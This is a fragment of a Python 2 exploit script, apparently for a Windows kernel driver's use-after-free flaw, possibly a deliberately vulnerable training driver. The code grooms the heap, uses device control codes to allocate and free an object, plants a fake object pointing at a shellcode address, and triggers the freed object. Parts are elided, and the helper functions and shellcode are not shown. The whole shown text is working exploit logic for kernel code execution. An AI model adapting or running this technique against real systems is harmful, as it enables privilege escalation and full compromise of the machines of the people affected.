...
if __name__ == "__main__":
        ...
        handlez = gethandle()
        heapfengshei()
        print "[*]Staging vulnerability[*]"
        trigger(handlez, ctl_code(0x804), 0, 0)
        print "\t[+]UAF object allocated"
        trigger(handlez, ctl_code(0x806), 0, 0)
        print "\t[+]UAF object freed"
        lpInBuffer = create_string_buffer(struct.pack("<L",shelladdr) + "\x41"*0x5B + "\x00")
        trigger(handlez, ctl_code(0x807), addressof(lpInBuffer), sizeof(lpInBuffer))
        print "\t[+]Fake object allocated"
        print "[*]Triggering vuln[*]"
        trigger(handlez, ctl_code(0x805), 0, 0)
